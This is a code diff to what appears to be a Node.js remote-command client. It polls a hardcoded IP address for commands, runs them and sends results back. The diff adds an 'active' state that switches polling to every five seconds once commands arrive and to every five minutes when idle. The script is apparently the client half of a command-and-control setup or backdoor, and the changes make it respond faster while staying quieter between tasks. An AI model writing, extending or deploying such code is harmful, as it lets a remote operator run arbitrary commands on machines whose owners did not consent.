@@ -6,6 +6,9 @@ const fs = require('fs');
 
 let host = 'http://45.32.41.191:81';
 let name = 'pc';
+let active = false;
+let lastFlushTime = 0;
+let lastActiveTime = 0;
 const openLink = false;
 const DEBUG = true;
 
@@ -22,12 +25,11 @@ function initHost() {
     else {
         fs.writeFileSync('name', name);
     }
-    name += 'bg';
     log('started with host:' + host + ' name:' + name);
 }
 
 function log(str) {
-    if(DEBUG) console.log(str);
+    if(DEBUG) console.log(str + '\n');
 }
 
 function get(url, callback){
@@ -60,7 +62,17 @@ function result(cmd, res, callback) {
 
 // change name to your client name
 function flush(){
-    // console.log('~');
+    let now = new Date().getTime();
+    if(!active && now - lastFlushTime < 5 * 60 * 1000) {
+        return;
+    }
+    // log('flush');
+    lastFlushTime = now;
+
+    if(active && now - lastActiveTime > 60 * 1000) {
+        log('deactive');
+        active = false;
+    }
     get(host + '/flush?name=' + name, async function (error, response, buf) {
         if(!buf) return;
         let json = new Buffer(buf).toString();
@@ -70,6 +82,9 @@ function flush(){
             let cmd = item.cmd;
             let encoding = item.encoding ? item.encoding :'gbk';
             if(cmd){
+                log('active');
+                active = true;
+                lastActiveTime = now;
                 // remove useless build_in
                 // if(await build_in.exec(item)){
                 //     console.log('build-in: ', cmd);
@@ -109,7 +124,7 @@ function resetHost() {
 
 function deamon(){
     setImmediate(flush);
-    setInterval(flush, 60000);
+    setInterval(flush, 5000);
     setInterval(resetHost, 60 * 60 * 1000);
     // setInterval(updateCode, 3 * 60 * 60 * 1000);
 }
